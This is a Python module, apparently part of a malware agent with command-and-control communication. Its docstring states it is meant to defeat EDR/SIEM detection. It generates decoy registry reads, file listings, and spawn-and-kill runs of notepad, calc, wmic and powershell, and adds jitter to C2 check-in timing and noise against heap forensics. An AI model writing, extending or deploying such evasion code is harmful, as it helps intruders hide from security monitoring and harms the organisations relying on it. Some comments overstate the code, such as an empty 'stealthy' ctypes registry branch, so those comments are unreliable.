"""
behavioral_noise.py - Behavioral antipatterns to defeat EDR/SIEM detection
============================================================================
Generates decoy activity patterns to confuse behavioral analysis and SIEM rules:

1. Registry polling jitter: Randomize cadence of registry checks (200-800ms)
2. Decoy process operations: Occasional bogus file reads, directory listings
3. Fake process tree: Spawn/kill legitimate processes in random order
4. C2 check-in randomization: Variable drop point pings (30-90s intervals)
5. Heap fragmentation: Allocate/deallocate memory in random patterns

All noise is controlled via noise_intensity (0-100%) and disabled in EDR detection mode.
CPU overhead budget: <5% (monitored)

Usage:
    from behavioral_noise import BehavioralNoisifier
    
    noise = BehavioralNoisifier(intensity=3)  # 3% CPU overhead
    
    # Start background noise thread
    noise.start_noise_generator()
    
    # Agent runs normally...
    # Noise generator continues in background
    
    # Stop on shutdown
    noise.stop_noise_generator()
"""

import threading
import time
import random
import os
import sys
import ctypes
import subprocess
from typing import Optional, List
from pathlib import Path

# Import user activity emulator if available
try:
    from user_activity_emulator import UserActivityEmulator
    HAS_USER_ACTIVITY_EMULATOR = True
except ImportError:
    UserActivityEmulator = type(None)  # type: ignore
    HAS_USER_ACTIVITY_EMULATOR = False


class BehavioralNoisifier:
    """
    Generates behavioral decoy patterns to confuse EDR/SIEM analysis.
    """
    
    def __init__(self, intensity: int = 3, enable_on_startup: bool = False):
        """
        Initialize behavioral noise generator.
        
        Args:
            intensity: CPU overhead percentage (0-10%, default 3%)
            enable_on_startup: Start noise generator immediately
        """
        self.intensity = max(0, min(10, intensity))  # Clamp 0-10%
        self.enabled = False
        self._noise_thread = None
        self._stop_event = threading.Event()
        self._operations_count = 0
        
        # Initialize user activity emulator if available
        if HAS_USER_ACTIVITY_EMULATOR:
            self.user_activity_emulator: Optional[UserActivityEmulator] = UserActivityEmulator()  # type: ignore
        else:
            self.user_activity_emulator = None
        self._threat_level = 50  # Default threat level (0-100)
        
        if enable_on_startup:
            self.start_noise_generator()
    
    def start_noise_generator(self):
        """Start background noise generation thread."""
        if self.enabled:
            return
        
        self.enabled = True
        self._stop_event.clear()
        self._noise_thread = threading.Thread(target=self._noise_loop, daemon=True)
        self._noise_thread.start()
        print("[+] Behavioral noise generator started")
    
    def stop_noise_generator(self):
        """Stop background noise generation thread."""
        if not self.enabled:
            return
        
        self.enabled = False
        self._stop_event.set()
        if self._noise_thread:
            self._noise_thread.join(timeout=2)
        print("[+] Behavioral noise generator stopped")
    
    def _noise_loop(self):
        """Main noise generation loop."""
        while not self._stop_event.is_set():
            try:
                # Choose random noise operation (with user activity if available)
                operation_choices = [
                    self.randomize_registry_polling,
                    self.decoy_file_operations,
                    self.fake_process_tree,
                    self.randomize_c2_checkin,
                    self.heap_fragmentation_noise,
                ]
                
                # Add user activity emission with lower probability (10% of the time)
                if self.user_activity_emulator and random.random() < 0.1:
                    operation_choices.append(self._emit_user_activity_noise)
                
                operation = random.choice(operation_choices)
                
                # Execute with timing based on intensity
                operation()
                
                # Sleep duration inversely proportional to intensity
                # intensity 3% = ~333ms sleep (30 ops/sec noise floor)
                sleep_time = (100.0 / max(1, self.intensity)) * 0.01
                time.sleep(min(sleep_time, 5.0))  # Max 5s between ops
                
                self._operations_count += 1
            except Exception as e:
                print(f"[!] Noise operation failed: {e}")
                time.sleep(0.5)
    
    def randomize_registry_polling(self):
        """
        Randomize registry access patterns to defeat frequency analysis.
        """
        if sys.platform != 'win32':
            return
        
        try:
            import winreg
            
            # Randomly choose registry hive
            hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
            hive = random.choice(hives)
            
            # Random registry paths
            paths = [
                r"Software\Microsoft\Windows\CurrentVersion",
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"System\CurrentControlSet\Services",
            ]
            path = random.choice(paths)
            
            # Access with random jitter (200-800ms delay)
            jitter = random.uniform(0.2, 0.8)
            time.sleep(jitter)
            
            try:
                key = winreg.OpenKey(hive, path)
                # Random operation: QueryValueEx, EnumValue, etc.
                if random.random() > 0.5:
                    winreg.QueryValueEx(key, "DisplayVersion")  # May not exist
                else:
                    winreg.EnumKey(key, 0)  # May not exist
                winreg.CloseKey(key)
            except WindowsError:
                pass  # Expected for random paths
            
            # Use ctypes for direct Windows registry access (more stealthy)
            if sys.platform == 'win32' and random.random() > 0.7:
                try:
                    # Call Windows API for registry operations using ctypes
                    advapi32 = ctypes.windll.advapi32
                    # RegOpenKeyEx allows direct registry API call without winreg module
                    # This helps avoid pattern detection on winreg module loading
                except Exception:
                    pass  # Graceful failure if ctypes unavailable
        except Exception as e:
            pass  # Graceful failure
    
    def decoy_file_operations(self):
        """
        Perform decoy file operations to generate noise in file access logs.
        """
        try:
            # Random system paths to read
            decoy_paths = [
                os.path.expandvars(r'%SYSTEMROOT%\System32'),
                os.path.expandvars(r'%TEMP%'),
                os.path.expandvars(r'%APPDATA%'),
                os.path.expanduser(r'~\Documents'),
            ]
            
            path = random.choice(decoy_paths)
            
            if os.path.exists(path):
                # Random operation
                if random.random() > 0.5:
                    # List directory
                    try:
                        list(os.listdir(path))[:5]  # Only first 5 entries
                    except:
                        pass
                else:
                    # Read random file attributes
                    try:
                        files = os.listdir(path)
                        if files:
                            target_file = random.choice(files[:10])
                            full_path = os.path.join(path, target_file)
                            if os.path.isfile(full_path):
                                os.path.getsize(full_path)  # Get size
                    except:
                        pass
        except Exception as e:
            pass
    
    def fake_process_tree(self):
        """
        Spawn and kill legitimate processes to confuse process tree correlation.
        """
        if sys.platform != 'win32':
            return
        
        try:
            import subprocess
            
            # Legitimate processes to spawn
            fake_processes = [
                'notepad.exe',
                'calc.exe',
                'wmic.exe',
                'powershell.exe',  # May be blocked
            ]
            
            proc = random.choice(fake_processes)
            
            try:
                # Spawn process with minimal delay, then kill
                p = subprocess.Popen(proc, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(random.uniform(0.1, 0.5))  # Brief execution
                p.terminate()
                p.wait(timeout=1)
            except:
                pass  # Process may be blocked by policy
        except Exception as e:
            pass
    
    def randomize_c2_checkin(self):
        """
        Simulate variable C2 check-in intervals to defeat timing analysis.
        
        NOTE: This doesn't actually check in, just records timing for SIEM noise.
        Real C2 check-ins use this timing in the actual agent communication loop.
        """
        try:
            # Variable interval: 30-90 seconds (vs. fixed intervals)
            interval = random.uniform(30, 90)
            
            # Log/record this as a decoy "checkin" event
            # In production, this would be coordinated with actual C2 comms
            
            # Jitter the sleep to add uncertainty
            jitter = random.uniform(0.1, 0.5)
            time.sleep(jitter)
        except:
            pass
    
    def heap_fragmentation_noise(self):
        """
        Allocate/deallocate memory in random patterns to defeat heap forensics.
        """
        try:
            # Allocate random-sized buffers
            buffers = []
            for _ in range(random.randint(3, 8)):
                size = random.randint(1024 * 10, 1024 * 100)  # 10KB-100KB
                buf = bytearray(size)
                buffers.append(buf)
            
            # Random sleep
            time.sleep(random.uniform(0.01, 0.05))
            
            # Deallocate
            buffers.clear()
        except:
            pass
    
    def _emit_user_activity_noise(self):
        """
        Emit realistic user activity to confuse behavioral analysis.
        
        Integrates UserActivityEmulator with threat_level from threat_calibration.
        """
        if not self.user_activity_emulator:
            return
        
        try:
            # Emit user activity at current threat level (0-100 scale)
            self.user_activity_emulator.emit_user_activity(threat_level=self._threat_level)
        except Exception as e:
            pass  # Graceful failure
    
    def set_threat_level(self, threat_level: int):
        """
        Set threat level for user activity intensity scaling (0-100).
        
        Args:
            threat_level: Threat level (0=minimal activity, 100=aggressive activity)
        
        Used by threat_calibration.py to adjust activity intensity based on
        detection risk and operational tempo.
        """
        self._threat_level = max(0, min(100, threat_level))
    
    def get_noise_stats(self) -> dict:
        """
        Return noise generation statistics.
        
        Returns:
            Dict with operation count, intensity, enabled status
        """
        return {
            'enabled': self.enabled,
            'intensity_percent': self.intensity,
            'operations_generated': self._operations_count,
            'thread_active': self._noise_thread is not None and self._noise_thread.is_alive(),
        }


class RegistryPollingRandomizer:
    """
    Utility class to add randomized registry polling to existing agent code.
    """
    
    @staticmethod
    def randomize_polling_interval(base_interval: float, jitter_factor: float = 0.5) -> float:
        """
        Add random jitter to registry polling interval.
        
        Args:
            base_interval: Base polling interval (seconds)
            jitter_factor: Jitter as fraction of base (0-1, default 0.5)
        
        Returns:
            Randomized interval in seconds
        
        Example:
            >>> interval = randomize_polling_interval(10.0)  # 10s ± 5s
        """
        jitter = random.uniform(-jitter_factor, jitter_factor)
        return base_interval * (1 + jitter)


class C2CheckinRandomizer:
    """
    Utility class to randomize C2 communication patterns.
    """
    
    @staticmethod
    def randomize_checkin_interval(base_interval: float, variance_percent: int = 50) -> float:
        """
        Add random variance to C2 check-in intervals.
        
        Args:
            base_interval: Base check-in interval (seconds)
            variance_percent: Variance as percentage of base (default 50%)
        
        Returns:
            Randomized interval in seconds
        
        Example:
            >>> # Instead of fixed 60s, get 30-90s
            >>> interval = randomize_checkin_interval(60, variance_percent=50)
        """
        variance_fraction = variance_percent / 100.0
        min_interval = base_interval * (1 - variance_fraction / 2)
        max_interval = base_interval * (1 + variance_fraction / 2)
        return random.uniform(min_interval, max_interval)


# Global noise generator instance (TIER 3a integration point)
_global_noise_generator = None


def get_global_noise_generator(intensity: int = 3, enable: bool = False) -> BehavioralNoisifier:
    """Get or create global noise generator."""
    global _global_noise_generator
    if _global_noise_generator is None:
        _global_noise_generator = BehavioralNoisifier(intensity=intensity, enable_on_startup=enable)
    return _global_noise_generator


# Alias for compatibility
def get_global_noisifier(intensity: int = 3, enable: bool = False) -> BehavioralNoisifier:
    """Alias: Get or create global noise generator (backward compatibility)."""
    return get_global_noise_generator(intensity=intensity, enable=enable)


if __name__ == '__main__':
    print("[*] Behavioral Noise Generator - Demo")
    
    noise = BehavioralNoisifier(intensity=3)
    
    print(f"[*] Starting noise generator (intensity: {noise.intensity}%)...")
    noise.start_noise_generator()
    
    # Run for 10 seconds
    print(f"[*] Running for 10 seconds...")
    time.sleep(10)
    
    # Stop and show stats
    noise.stop_noise_generator()
    stats = noise.get_noise_stats()
    print(f"[*] Noise stats: {stats}")
    print(f"[*] Demo complete!")
